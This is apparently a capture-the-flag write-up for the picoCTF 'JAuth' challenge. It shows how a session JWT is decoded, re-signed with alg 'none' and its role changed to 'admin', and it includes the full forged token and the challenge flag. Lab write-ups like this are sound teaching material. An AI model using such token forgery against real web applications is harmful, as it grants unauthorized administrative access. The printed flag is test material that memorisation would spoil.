# JAuth

### Description:

Most web application developers use third party components without testing their security. Some of the past affected companies are:
Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
VerticalScope (internet media company) - outdated version of vBulletin forum software used
Can you identify the components and exploit the vulnerable one?
Additional details will be available after launching your challenge instance.
Click 'Launch Instance'.
The website is running `here`. Can you become an admin?
You can login as `test` with the password `Test123`! to get started.

### Commands / Steps:

```bash
# Step 1: Go to the website.

# Step 2: Log in with the credentials given in the question.

# Step 3: Let's open the dev tools first to check if there's anythikng suspicious.

# Step 4: There's nothing suspicious in the "Elements" tab and the "Sources" tab. 

# Step 5: If we go to the "Application" tab and check the cookie, the value looks suspicious so I decoded it from base64 first.

# Step 6: We get a string if we decode it in cyberchef.
Token value: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzY0MjU3MjkzNzgxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDIuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzY0MjU3Mjk0fQ.pPzPHj4tuIcu77tYR_tRlDMVF6EChtE3HPnW-5sHRIY
Decoded string: {"typ":"JWT","alg":"HS256"}{"auth":1764257293781,"agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36","role":"user","iat":1764257294}
OÌñãâÛrîûµmFPÌT^
DÜsç[D

# Step 7: It's JWT token. And the question is asking us to log in as an admin. So let's see if we can manipulate the token. I will use 'token.dev' to decode the token.
# jwt token -- header.payload.signature
# Set the "alg" in header to 'none' so that we don't have to include a signature.

Header: 
{
  "typ": "JWT",
  "alg": "none"
}

Payload: 
{
  "auth": 1764257293781,
  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
  "role": "admin",
  "iat": 1764257294
}

token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzY0MjU3MjkzNzgxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDIuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc2NDI1NzI5NH0

# Step 8: The jwt tokens should always have two separaters, ".". So let's add a trailing dot to the end of the toke. Then we replace the token value in the application tab and then refresh the website to get the flag.
```

### Flag:

> picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}

### Notes / Tips

- `JWT (JSON Web Token)`: A standard for securely transmitting information between parties as a JSON object
- `JWT Structure`: Three parts separated by dots:
    - `Header`: Contains token type and algorithm (e.g., HS256, RS256, none)
    - `Payload`: Contains the claims (user data, roles, permissions)
    - `Signature`: Cryptographic signature that verifies token integrity



